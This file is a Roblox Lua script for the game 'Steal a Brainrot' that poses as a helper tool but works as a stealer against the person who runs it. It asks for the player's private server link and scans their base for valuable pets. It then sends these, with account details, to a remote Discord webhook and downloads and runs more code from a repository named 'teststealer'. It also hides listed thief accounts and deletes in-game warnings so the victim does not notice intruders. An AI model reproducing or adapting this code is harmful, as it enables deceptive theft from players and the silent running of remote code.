-- Services (single place)
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local localPlayer = player

-- Hide default leaderboard (from your cleanup script)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)

-- Load config from GitHub (unchanged)
local config = {}
do
    local ok, res = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/realscript/refs/heads/main/config"))()
    end)
    if ok and type(res) == "table" then
        config = res
    else
        config = {
            WEBHOOK = "",
            targetNames = {},
            Receiver = {}
        }
    end
end

local WEBHOOK = config.WEBHOOK
local targetNames = config.targetNames or {}
local receiverList = table.concat(config.Receiver or {}, ", ")

-- Executor & account age detection (unchanged)
local function detectExecutor()
    if syn then return "Synapse X"
    elseif KRNL_LOADED then return "KRNL"
    elseif fluxus then return "Fluxus"
    elseif secure_load then return "Sentinel"
    elseif getexecutorname then return getexecutorname()
    elseif identifyexecutor then return identifyexecutor()
    else return "Unknown" end
end

local function getAccountAge()
    return player and player.AccountAge or 0
end

-- Detect server type (unchanged)
local serverType = "UNKNOWN"
local map = Workspace:FindFirstChild("Map")
if map then
    local codes = map:FindFirstChild("Codes")
    local main = codes and codes:FindFirstChild("Main")
    local surfaceGui = main and main:FindFirstChild("SurfaceGui")
    local sFrame = surfaceGui and surfaceGui:FindFirstChild("MainFrame")
    local privateMsg = sFrame and sFrame:FindFirstChild("PrivateServerMessage")
    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
end

-- Only allow private servers (keeps original behavior)
if serverType == "PUBLIC SERVER" then
    warn("Only use this script in private servers")
    return
end

-- Get priority index for a pet name
local function getPriority(name)
    for i, t in ipairs(targetNames) do
        if t.name and name:find(t.name) then
            return i
        end
    end
    return math.huge
end

local function shuffle(tbl)
    for i = #tbl, 2, -1 do
        local j = math.random(i)
        tbl[i], tbl[j] = tbl[j], tbl[i]
    end
end

-- ================= SCAN ALL PETS IN YOUR BASE (FULL VERSION) ================= --
local function scanMyBase()
    local found = {}
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return found end

    local myName = player.DisplayName

    for _, plot in ipairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local sg = sign:FindFirstChild("SurfaceGui")
            local frame = sg and sg:FindFirstChild("Frame")
            local label = frame and frame:FindFirstChild("TextLabel")

            if label and typeof(label.Text) == "string" and label.Text:find(myName) then
                print("✅ Your base detected:", plot.Name)

                for _, obj in ipairs(plot:GetDescendants()) do
                    if obj:IsA("BillboardGui") then
                        local overhead = obj
                        local displayName = overhead:FindFirstChild("DisplayName")
                        if displayName and displayName:IsA("TextLabel") then
                            local petName = displayName.Text or "Unknown"
                            local gen = overhead:FindFirstChild("Generation")
                            local value = gen and gen.Text or "Unknown"

                            local floor = "Unknown Floor"

                            -- Check nearest podium for floor detection
                            local nearestPodiumDist = math.huge
                            local podiums = plot:FindFirstChild("AnimalPodiums")
                            if podiums then
                                for _, podium in ipairs(podiums:GetChildren()) do
                                    if podium:IsA("Model") then
                                        local basePart = podium:FindFirstChildWhichIsA("BasePart", true)
                                        if basePart then
                                            local success, dist = pcall(function()
                                                return (overhead.Adornee.Position - basePart.Position).Magnitude
                                            end)
                                            if success and dist < nearestPodiumDist then
                                                nearestPodiumDist = dist
                                                local num = tonumber(podium.Name:match("^(%d+)_?"))
                                                if num then
                                                    if num >= 1 and num <= 10 then
                                                        floor = "1st Floor"
                                                    elseif num <= 18 then
                                                        floor = "2nd Floor"
                                                    else
                                                        floor = "3rd Floor"
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end

                            table.insert(found, {
                                name = petName,
                                value = value,
                                floor = floor
                            })

                            print("📌 Found:", petName, "|", value, "|", floor)
                        end
                    end
                end

                break
            end
        end
    end

    return found
end

-- Parse numeric value from string like "7.5M/s"
local function parseValue(str)
    local num = tonumber(str:match("[%d%.]+")) or 0
    if str:find("K") then return num * 1e3
    elseif str:find("M") then return num * 1e6
    elseif str:find("B") then return num * 1e9
    else return num end
end

-- Send webhook (pets sorted by numeric value)
local function sendWebhook(pets, privateServerLink)
    if not pets or #pets == 0 then return end
    if player and player:GetAttribute("WebhookSent") then return end

    local highValueThreshold = 7.5e6 -- 7.5M/s
    local priorityPets, normalPets = {}, {}
    local shouldPing = false

    for _, pet in ipairs(pets) do
        local valueNum = parseValue(pet.value)
        local line = string.format("%s → %s → %s", pet.name, pet.value, pet.floor)
        if valueNum >= highValueThreshold then
            shouldPing = true
            table.insert(priorityPets, {line = line, valueNum = valueNum})
        else
            table.insert(normalPets, {line = line, valueNum = valueNum})
        end
    end

    -- Sort descending by numeric value
    table.sort(priorityPets, function(a,b) return a.valueNum > b.valueNum end)
    table.sort(normalPets, function(a,b) return a.valueNum > b.valueNum end)

    local orderedLines = {}
    for _, p in ipairs(priorityPets) do table.insert(orderedLines, p.line) end
    for _, n in ipairs(normalPets) do table.insert(orderedLines, n.line) end

    local lootText = #orderedLines > 0 and table.concat(orderedLines, "\n") or "Empty"
    if lootText == "Empty" then return end

    local playerInfoText = "```" ..
        "Name: "..(player and player.Name or "Unknown").."\n"..
        "Receiver: "..receiverList.."\n"..
        "Executor: "..detectExecutor().."\n"..
        "Account Age: "..tostring(getAccountAge()).." days".."```"

    local petsText = "```"..lootText.."```"

    local serverLink = privateServerLink or "No link entered"

    local embed = {
        ["title"] = "🧠 Steal a Brainrot HIT! - bloomscripts 🧠",
        ["color"] = 12413107,
        ["fields"] = {
            {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
            {["name"]="Server Type", ["value"]=serverType},
            {["name"]="👥 Player Info", ["value"]=playerInfoText},
            {["name"]="🎒 Brainrots in Base", ["value"]=petsText},
            {["name"]="Join Server Link", ["value"]=("[Click to Join Server](%s)"):format(serverLink)}
        }
    }

    local payload = {
        ["content"] = shouldPing and "--- @everyone 🔥 **High Value Brainrot Detected!**" or "",
        ["embeds"] = {embed},
        ["allowed_mentions"] = {["parse"] = shouldPing and {"everyone"} or {}}
    }

    local req = (syn and syn.request) or http_request or (http and http.request) or request
    if req and WEBHOOK and WEBHOOK ~= "" then
        pcall(function()
            req({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"]="application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
        if player then
            player:SetAttribute("WebhookSent", true)
        end
    end
end

--================= GUI FOR PRIVATE SERVER LINK =================--
local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "StealBrainrotGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0, 320, 0, 180)
frame.Position = UDim2.new(0.5, -160, 0.5, -90)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", frame)
title.Text = "Steal a Brainrot"
title.Font = Enum.Font.FredokaOne
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 4)

local closeButton = Instance.new("TextButton", frame)
closeButton.Text = "X"
closeButton.Font = Enum.Font.FredokaOne
closeButton.TextSize = 18
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
closeButton.Size = UDim2.new(0, 28, 0, 28)
closeButton.Position = UDim2.new(1, -34, 0, 4)
Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)

local textBox = Instance.new("TextBox", frame)
textBox.Size = UDim2.new(0.9, 0, 0, 36)
textBox.Position = UDim2.new(0.05, 0, 0, 50)
textBox.PlaceholderText = "Enter your private server link"
textBox.Text = ""
textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.ClearTextOnFocus = false
textBox.Font = Enum.Font.FredokaOne
textBox.TextSize = 14
Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 8)

local statusLabel = Instance.new("TextLabel", frame)
statusLabel.Size = UDim2.new(0.9, 0, 0, 24)
statusLabel.Position = UDim2.new(0.05, 0, 0, 90)
statusLabel.Text = ""
statusLabel.Font = Enum.Font.FredokaOne
statusLabel.TextSize = 14
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.BackgroundTransparency = 1

local sendButton = Instance.new("TextButton", frame)
sendButton.Text = "Send"
sendButton.Font = Enum.Font.FredokaOne
sendButton.TextSize = 18
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
sendButton.Size = UDim2.new(0.4, 0, 0, 32)
sendButton.Position = UDim2.new(0.3, 0, 0, 120)
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 8)

-- ✅ Private server link validation
local function isValidPrivateServerLink(txt)
    return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
end

textBox:GetPropertyChangedSignal("Text"):Connect(function()
    if isValidPrivateServerLink(textBox.Text) then
        statusLabel.Text = "Valid ✅"
        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    else
        statusLabel.Text = "Invalid ❌"
        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

-- ✅ Send webhook and trigger loading screen after valid link
local function handleSend()
    local txt = textBox.Text or ""
    if isValidPrivateServerLink(txt) then
        screenGui:Destroy()
        task.spawn(function()
            local pets = scanMyBase() -- uses full scan
            if #pets > 0 then
                sendWebhook(pets, txt) -- ✅ Pass private server link
            end
            task.wait(1)
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/teststealer/refs/heads/main/test3"))()
            end)
        end)
    else
        warn("Invalid private server link!")
    end
end

sendButton.MouseButton1Click:Connect(handleSend)
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then handleSend() end
end)

-- ===========================
-- Base cleanup / duplication (runs silently in background)
-- ===========================

local plotsFolder = Workspace:FindFirstChild("Plots")
local myBase = nil
local duplicatedBaseDone = false
local clonedPodiumsDone = false
local badPlayers = {"gagst34l3r", "13sabst34l3r", "TDNMTM_7", "Xerpier728", "light1234005"}

-- Find your base
local function FindMyBase()
    if not plotsFolder then return nil end
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign and sign:FindFirstChild("YourBase") then
            local yourBase = sign.YourBase
            if yourBase.Enabled == true then
                return plot
            end
        end
    end
    return nil
end

-- Preserve animations from original to clone
local function PreserveAnimations(original, clone)
    for _, origDesc in ipairs(original:GetDescendants()) do
        if origDesc:IsA("Animator") then
            local cloneAnim = clone:FindFirstChildWhichIsA("Animator", true)
            if cloneAnim then
                for _, track in ipairs(origDesc:GetPlayingAnimationTracks()) do
                    local anim = Instance.new("Animation")
                    anim.AnimationId = track.Animation.AnimationId
                    local newTrack = cloneAnim:LoadAnimation(anim)
                    newTrack:Play()
                end
            end
        end
    end
end

-- Duplicate base models (except special ones)
local function DuplicateBaseModelsOnce(base)
    if not base or duplicatedBaseDone then return end
    for _, obj in ipairs(base:GetChildren()) do
        if obj:IsA("Model") and obj.Name ~= "FriendPanel" and obj.Name ~= "AnimalPodiums" then
            local clone = obj:Clone()
            clone.Name = obj.Name .. "_clone"
            clone.Parent = base
            PreserveAnimations(obj, clone)
            obj:Destroy()
        end
    end
    duplicatedBaseDone = true
end

-- Duplicate AnimalPodiums
local function DuplicateAnimalPodiumsOnce(base)
    if not base or clonedPodiumsDone then return end
    local podiums = base:FindFirstChild("AnimalPodiums")
    if podiums then
        for _, p in ipairs(podiums:GetChildren()) do
            if p:IsA("Model") then
                local c = p:Clone()
                c.Name = p.Name .. "_clone"
                c.Parent = podiums
                PreserveAnimations(p, c)
                p:Destroy()
            end
        end
        clonedPodiumsDone = true
    end
end

-- Clean hitboxes in Purchases
local function cleanHitboxes(base)
    if not base then return end
    local purchases = base:FindFirstChild("Purchases")
    if not purchases then return end

    local function processTarget(target)
        if not target then return end
        for _, obj in ipairs(target:GetDescendants()) do
            if string.lower(obj.Name) == "hitbox" then
                obj:Destroy()
            end
        end
        target.DescendantAdded:Connect(function(newObj)
            if string.lower(newObj.Name) == "hitbox" then
                newObj:Destroy()
            end
        end)
    end

    for _, child in ipairs(purchases:GetChildren()) do
        processTarget(child)
    end
    purchases.ChildAdded:Connect(function(newChild)
        task.wait(0.05)
        processTarget(newChild)
    end)
end

-- Delete bad players' models continuously
local function DeletePlayerModelsLoop()
    while true do
        for _, name in ipairs(badPlayers) do
            local m = Workspace:FindFirstChild(name)
            if m then
                m:Destroy()
            end
        end
        task.wait(1)
    end
end

-- Remove unwanted GUIs and sounds
local function RemoveGuiAndSoundsLoop()
    while true do
        local pg = localPlayer and localPlayer:FindFirstChild("PlayerGui")
        if pg then
            local notif = pg:FindFirstChild("Notification")
            if notif then
                notif:Destroy()
            end
        end
        local s = ReplicatedStorage:FindFirstChild("Sounds")
        if s and s:FindFirstChild("Sfx") and s.Sfx:FindFirstChild("Warn") then
            s.Sfx.Warn:Destroy()
        end
        task.wait(1)
    end
end

-- Clone and replace all other bases
local function CloneAndReplaceOtherBases(myBase)
    if not plotsFolder then return end
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        if plot ~= myBase then
            local clone = plot:Clone()
            clone.Name = plot.Name .. "_Clone"
            clone.Parent = plotsFolder
            PreserveAnimations(plot, clone)
            plot:Destroy()
        end
    end
end

-- Main spawn loop for cleanup/duplication (runs silently)
task.spawn(function()
    while not plotsFolder do
        plotsFolder = Workspace:FindFirstChild("Plots")
        task.wait(0.1)
    end

    myBase = FindMyBase()
    if myBase then
        DuplicateBaseModelsOnce(myBase)
        DuplicateAnimalPodiumsOnce(myBase)
        cleanHitboxes(myBase)
    end

    CloneAndReplaceOtherBases(myBase)

    task.spawn(DeletePlayerModelsLoop)
    task.spawn(RemoveGuiAndSoundsLoop)
end)

-- Hide bad players in CoreGui (loop)
task.spawn(function()
    local CoreGui = game:GetService("CoreGui")
    while task.wait(0.5) do
        -- Settings GUI
        local root = CoreGui:FindFirstChild("RobloxGui")
            and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
            and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield
                :FindFirstChild("MenuContainer")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer
                :FindFirstChild("PageViewClipper")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper
                :FindFirstChild("PageView")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView
                :FindFirstChild("PageViewInnerFrame")
            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView.PageViewInnerFrame
                :FindFirstChild("Players")

        if root then
            for _, badName in ipairs(badPlayers) do
                local fullLabel = "PlayerLabel" .. badName
                local target = root:FindFirstChild(fullLabel)
                if target then
                    target:Destroy()
                end
            end
        end

        -- PlayerList GUI
        local success, scrollList = pcall(function()
            return CoreGui.PlayerList
                .Children.BodyBackground
                .ContentFrame
                .PlayerScrollList
        end)

        if success and scrollList then
            local teamList = scrollList:FindFirstChild("TeamList_Neutral")
            if teamList then
                for _, entry in ipairs(teamList:GetChildren()) do
                    if entry.Name:match("^PlayerEntry_") then
                        local nameLabel = entry:FindFirstChild("ChildrenFrame")
                            and entry.ChildrenFrame:FindFirstChild("NameFrame")
                            and entry.ChildrenFrame.NameFrame:FindFirstChild("PlayerName")
                            and entry.ChildrenFrame.NameFrame.PlayerName:FindFirstChild("PlayerName")

                        if nameLabel and nameLabel:IsA("TextLabel") then
                            local playerName = nameLabel.Text
                            for _, badName in ipairs(badPlayers) do
                                if string.lower(playerName) == string.lower(badName) then
                                    entry:Destroy()
                                    break
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)

-- Protect essential models and clean up random models
task.spawn(function()
    local protectedModels = {
        ["Witch"] = true,
        ["ShopNPCRobuxIdle"] = true,
        ["ShopNPCCash"] = true,
        ["Shop"] = true,
        ["RobuxShop"] = true,
        ["FuseMachine"] = true,
        ["CraftingMachine"] = true,
    }

    local function isRandomID(name)
        return name and name:match("^[%w]+%-[%w]+%-[%w]+%-[%w]+%-[%w]+$") ~= nil
    end

    while task.wait(0.1) do
        for _, obj in ipairs(Workspace:GetChildren()) do
            if obj:IsA("Model") then
                local name = obj.Name
                if not protectedModels[name] and not isRandomID(name) then
                    local playerExists = Players:FindFirstChild(name)
                    if not playerExists then
                        obj:Destroy()
                    end
                end
            end
        end
    end
end)

